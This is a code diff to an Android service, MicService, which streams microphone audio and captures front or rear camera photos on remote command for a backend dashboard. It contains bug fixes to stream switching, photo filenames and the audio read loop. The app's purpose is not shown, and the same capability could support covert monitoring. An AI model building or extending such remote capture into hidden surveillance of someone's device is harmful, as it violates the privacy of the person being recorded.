@@ -1112,7 +1112,11 @@ class MicService : Service() {
             "start_stream" -> {
                 Log.i(TAG, "CMD: start mic stream")
                 wantsMicStreaming = true
-                if (!isWebRtcStreaming) {
+                if (isWebRtcStreaming) {
+                    Log.i(TAG, "Stopping WebRTC to allow PCM stream")
+                    stopWebRtcSession(notifyState = true)
+                    // stopWebRtcSession will automatically start PCM stream after 1s delay
+                } else {
                     val staleCapture = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 20_000)
                     if (staleCapture) {
                         stopAudioCapture("start_stream_stale_restart")
@@ -2205,7 +2209,12 @@ class MicService : Service() {
                     val optimized = optimizePhotoJpeg(jpeg, isFrontCamera)
                     val cameraName = if (isFrontCamera) "front" else "rear"
                     preferredCameraFacing = actuallyUsedFacing
-                    val filename = "photo_${deviceId.take(8)}_${cameraName}_${System.currentTimeMillis()}.jpg"
+                    
+                    // Bug Fix: Embed quality and night mode in filename so backend/dashboard can display it
+                    // Format: photo_{deviceId}_{camera}_{quality}_{nightMode}_{timestamp}.jpg
+                    val safeQuality = photoQualityMode.replace(Regex("[^a-zA-Z0-9]"), "")
+                    val safeNight = photoNightMode.replace(Regex("[^a-zA-Z0-9]"), "")
+                    val filename = "photo_${deviceId.take(8)}_${cameraName}_${safeQuality}_${safeNight}_${System.currentTimeMillis()}.jpg"
 
                     var httpSuccess = false
                     try {
@@ -3152,13 +3161,19 @@ class MicService : Service() {
                         Log.i(TAG, "Adjusted audio frame size to ${currentStreamFrameMs()}ms ($newTargetChunkSize bytes)")
                     }
 
-                    val readTarget = min(frameBuffer.size - frameFill, audioReadBufferSize)
-                    val read = audioRecord?.read(frameBuffer, frameFill, readTarget) ?: -1
+                    val read = if (frameFill < targetChunkSize) {
+                        val readTarget = min(frameBuffer.size - frameFill, audioReadBufferSize)
+                        audioRecord?.read(frameBuffer, frameFill, readTarget) ?: -1
+                    } else {
+                        // Skip blocking read if we already have a full chunk ready to process
+                        0
+                    }
+
                     if (read > 0) {
                         frameFill += read
-                        if (frameFill < targetChunkSize) {
-                            continue
-                        }
+                    }
+
+                    if (frameFill >= targetChunkSize) {
                         System.arraycopy(frameBuffer, 0, chunk, 0, targetChunkSize)
                         val remaining = frameFill - targetChunkSize
                         if (remaining > 0) {
